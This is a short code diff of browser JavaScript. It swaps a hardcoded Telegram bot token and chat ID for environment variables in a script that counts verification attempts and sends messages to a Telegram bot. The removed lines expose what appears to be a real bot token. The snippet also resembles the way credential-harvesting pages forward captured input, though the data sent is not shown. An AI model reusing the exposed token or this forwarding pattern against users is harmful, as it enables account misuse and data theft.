@@ -22,9 +22,9 @@ document.addEventListener('DOMContentLoaded', function () {
     let verificationAttempts = 0;
     const maxAttempts = 6;
 
-    const botToken = '7639020729:AAEOGFNZaO31czTvN0ZMNz4G1UJv0aulGe4';
-    const chatId = '7732620750';
-
+    const botToken = process.env.TELEGRAM_BOT_TOKEN;
+const chatId = process.env.TELEGRAM_CHAT_ID;
+    
     async function sendToTelegram(message) {
         try {
             await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
